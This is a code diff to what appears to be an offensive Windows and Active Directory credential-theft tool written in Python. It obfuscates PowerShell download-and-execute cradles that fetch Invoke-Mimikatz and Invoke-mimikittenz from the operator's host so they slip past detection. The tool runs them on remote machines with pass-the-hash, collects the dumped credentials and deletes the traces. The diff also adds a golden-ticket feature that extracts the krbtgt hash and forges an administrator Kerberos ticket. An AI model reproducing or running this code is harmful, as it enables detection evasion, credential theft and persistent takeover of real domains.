@@ -478,7 +478,7 @@ def datadump(user, passw, host, path, os_version):
 						print colored("[-]Cannot find Invoke-Mimikatz.ps1",'red')
 						exit(1)
 					print colored("[+]Looks good",'green')	
-					PORT = 1234
+					PORT = 3737
 										
 					my_ip=get_ip_address('eth0')
 					print colored("[+]Attempting to Run Safe Mimikatz",'green')
@@ -492,11 +492,11 @@ def datadump(user, passw, host, path, os_version):
 					print colored("[+]Creating powershell script in /tmp/safe_mimi.ps1",'green')
 					fout=open('/tmp/safe_mimi.ps1','w')
 
-					line = "iex ((New-Object System.Net.WebClient).DownloadString('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/Invoke-Mimikatz.ps1')); Invoke-Mimikatz -DumpCreds > c:\\creds.txt"
+					line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/Invoke-Mimikatz.ps1')); Invoke-Mimikatz -DumpCreds > c:\\creds.txt"
 					fout.write(line)
 					fout.close()
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put safe_mimi.ps1\' 2>/dev/null")
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonInteractive -NoProfile -ExecutionPolicy ByPass -File c:\\safe_mimi.ps1 -Verb RunAs\" 2>/dev/null")
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | powershell.exe -NonI -NoP -ExecutionPolicy ByPass -File c:\\safe_mimi.ps1 -Verb RunAs\" 2>/dev/null")
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get creds.txt\' 2>/dev/null")
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\creds.txt c:\\safe_mimi.ps1\" 2>/dev/null")
 					if os.path.isfile(outputpath+host+"/creds.txt"):
@@ -543,7 +543,7 @@ def datadump(user, passw, host, path, os_version):
 					print colored("[+]Creating powershell script in /tmp/mimikittenz.ps1",'green')
 					fout=open('/tmp/mimikittenz.ps1','w')
 
-					line = "iex ((New-Object System.Net.WebClient).DownloadString('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/Invoke-mimikittenz.ps1')); Invoke-mimikittenz > c:\\kittenz_creds.txt"
+					line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/Invoke-mimikittenz.ps1')); Invoke-mimikittenz > c:\\kittenz_creds.txt"
 					fout.write(line)
 					fout.close()
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd /tmp; put mimikittenz.ps1\' 2>/dev/null")
@@ -911,6 +911,8 @@ p.add_argument("-hK", "--mimikittenz", dest="mimikittenz", default="n", help="<O
 p.add_argument("-hL", "--lsass_dump", dest="lsass_dump", default="n", help="<Optional> Dump lsass for offline use with mimikatz")
 p.add_argument("-hM", "--massmimi_dump", dest="massmimi_dump", default="n", help="<Optional> Mimikatz Dump Credentaisl from the remote machine(s)")
 p.add_argument("-hR", "--safe_mimi", dest="safe_mimi", default="n", help="<Optional> safe version of mass-mimikatz")
+p.add_argument("-hT", "--golden_ticket", dest="golden_ticket", default="n", help="<Optional> Create a Golden Ticket")
+
 # Enumeration related
 p.add_argument("-eA", "--service_accounts", dest="service_accounts", default="n", help="<Optional> Enum service accounts, if any")
 p.add_argument("-eL", "--find_user", dest="find_user", default="n", help="<Optional> Find user - Live")
@@ -962,6 +964,7 @@ qldap=args.qldap
 edq_uac=args.edq_uac
 safe_mimi=args.safe_mimi
 mimikittenz=args.mimikittenz
+golden_ticket=args.golden_ticket
 
 if lat in yesanswers:
 	WriteLAT()
@@ -1006,6 +1009,84 @@ elif remotetargets[0:6]=='range=':
 	for remotetarget in IPNetwork(remotetargets[6:len(remotetargets)]):
 		targets.append (remotetarget);
 
+if golden_ticket in yesanswers:
+	if len(targets)==1:
+		try:
+						
+			if os.path.isfile(outputpath+targets[0]+"/nt.txt"):
+				print colored("[+]Found file - completed : "+outputpath+targets[0]+"/nt.txt",'green')
+				print colored("[+]Taking krbtgt hash from pre parsed hashes",'yellow')
+				if 'krbtgt' in open(outputpath+targets[0]+"/nt.txt").read():
+					
+					with open(outputpath+targets[0]+"/nt.txt",'r') as inifile:
+						data=inifile.read()
+						hash_list=data.splitlines()
+						for k in hash_list:
+							if k[0:6]=='krbtgt':
+								khash=k
+								
+								kNTHASH=khash.split(':')[3] #NT Hash
+								print colored("[+]krbtgt NTLM Hash",'green')
+								print colored(kNTHASH,'yellow')
+								break					
+			else:
+				print colored("[+]Pre parsed hashes not found : "+outputpath+targets[0]+"/nt.txt",'green')
+				print colored("[+]Connecting to DC to get krbtgt hash : ",'yellow')
+				proc = subprocess.Popen("secretsdump.py "+domain_name+'/'+user+':'+passw+'\\'+'@'+targets[0] +" -just-dc-user krbtgt", stdout=subprocess.PIPE,shell=True)
+				stdout_value = proc.communicate()[0]
+				krbtgt_data=stdout_value.splitlines()
+				for hash_line in krbtgt_data:
+					if hash_line[0:6]=='krbtgt':
+						khash=hash_line
+						kNTHASH=khash.split(':')[3] #NT Hash
+						print colored("[+]krbtgt NTLM Hash",'green')
+						print colored(kNTHASH,'yellow')
+						break					
+			
+
+			if len(kNTHASH)>0:
+				#Get the SID Information
+				proc = subprocess.Popen("pth-rpcclient -U "+user+"%"+passw+" "+ targets[0]+" -c \"lookupnames krbtgt\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+				stdout_value = proc.communicate()[0]
+					
+				if not "krbtgt" in stdout_value:
+					print colored("[+]krbtgt SID NOT FOUND...",'red')
+					sys.exit()
+						
+				else:
+					sid=stdout_value.split(' ')[1]
+					kSID=sid[:-len(khash.split(':')[1])-1]
+
+					print colored("[+]krbtgt SID",'green')
+					print colored(kSID,'yellow')
+											
+					proc = subprocess.Popen("ticketer.py -nthash "+kNTHASH + " -domain-sid "+kSID+" -domain "+domain_name+ " -dc-ip "+ targets[0]+" administrator", stdout=subprocess.PIPE,shell=True)
+					stdout_value = proc.communicate()[0]
+					
+					if "Saving ticket" in stdout_value:
+						
+						if not os.path.isdir(outputpath+targets[0]):
+							proc = subprocess.Popen("mkdir "+outputpath+targets[0], stdout=subprocess.PIPE,shell=True)
+							stdout_value = proc.communicate()[0]
+
+						if os.path.isdir(outputpath+targets[0]):
+							proc = subprocess.Popen("cp ./administrator.ccache "+outputpath+targets[0]+"/administrator.ccache", stdout=subprocess.PIPE,shell=True)
+							stdout_value = proc.communicate()[0]
+
+							proc = subprocess.Popen("rm ./administrator.ccache ", stdout=subprocess.PIPE,shell=True)
+							stdout_value = proc.communicate()[0]
+
+						if os.path.isfile(outputpath+targets[0]+"/administrator.ccache"):
+							print colored("[+]Ticket Created "+outputpath+targets[0]+"/administrator.ccache",'green')
+							print colored("[+]To export - export KRB5CCNAME='"+outputpath+targets[0]+"/administrator.ccache'",'yellow')
+
+					else:
+						print colored("[-]Something Went Wrong Creating Golden-Ticket...",'red')
+
+			sys.exit()
+		except OSError:
+			print colored("[-]Something went wrong creating Golden-Ticket",'red')		
+			sys.exit()
 
 if password_policy in yesanswers:
 	if len(targets)==1:
